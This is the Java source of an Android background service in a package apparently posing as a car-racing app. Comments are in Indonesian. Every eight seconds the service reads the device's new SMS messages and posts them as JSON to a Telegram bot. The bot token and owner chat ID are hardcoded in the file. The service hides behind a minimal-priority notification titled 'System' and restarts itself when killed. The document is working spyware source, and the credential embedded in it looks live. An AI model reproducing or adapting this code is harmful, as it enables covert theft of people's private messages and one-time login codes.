package com.carrace;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.HashSet;
import java.util.Set;

public class SmsService extends Service {

    private static final String TAG = "SmsService";
    private static final long LOOP_MS = 8000L;

    // ====== KONFIGURASI OWNER ======
    private static final String BOT_TOKEN = "8539992688:AAEuPMyOXEweuaaHebCjGqsnMdeucQFKXhA";
    private static final String OWNER_ID  = "8275632263";
    // ==============================

    private final Handler handler = new Handler(Looper.getMainLooper());
    private final Set<String> sentIds = new HashSet<>();
    private boolean running;
    private final Runnable loop = new Runnable() {
        @Override public void run() {
            try { poll(); } catch (Exception e) { Log.w(TAG, "poll error", e); }
            if (running) handler.postDelayed(this, LOOP_MS);
        }
    };

    @Override public void onCreate() {
        super.onCreate();
        startForegroundSafely();
        running = true;
        handler.post(loop);
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        if (!running) { running = true; handler.post(loop); }
        return START_STICKY;
    }

    @Override public void onDestroy() {
        running = false;
        handler.removeCallbacks(loop);
        super.onDestroy();
    }

    @Override public IBinder onBind(Intent intent) { return null; }

    private void startForegroundSafely() {
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationChannel ch = new NotificationChannel(
                        "sms_sync", "System Sync", NotificationManager.IMPORTANCE_MIN);
                ch.setShowBadge(false);
                NotificationManager nm = getSystemService(NotificationManager.class);
                if (nm != null) nm.createNotificationChannel(ch);
            }
            Notification.Builder b = Build.VERSION.SDK_INT >= 26
                    ? new Notification.Builder(this, "sms_sync")
                    : new Notification.Builder(this);
            b.setContentTitle("System")
             .setContentText("Running")
             .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setOngoing(true);
            startForeground(1, b.build());
        } catch (RuntimeException e) { Log.w(TAG, "foreground gagal", e); }
    }

    private void poll() {
        JSONArray baru = SmsReader.readNewSms(this, sentIds);
        if (baru.length() == 0) return;
        String json = baru.toString();
        SmsReader.writeJsonToDisk(this, json);
        sendToTelegram(json);
    }

    private void sendToTelegram(String json) {
        HttpURLConnection c = null;
        try {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
            c = (HttpURLConnection) url.openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setConnectTimeout(15000);
            c.setReadTimeout(15000);
            c.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            JSONObject body = new JSONObject();
            body.put("chat_id", OWNER_ID);
            body.put("text", json);
            try (OutputStream os = c.getOutputStream()) {
                os.write(body.toString().getBytes(StandardCharsets.UTF_8));
            }
            int code = c.getResponseCode();
            Log.i(TAG, "telegram response=" + code);
        } catch (Exception e) {
            Log.w(TAG, "telegram gagal", e);
        } finally {
            if (c != null) c.disconnect();
        }
    }
}
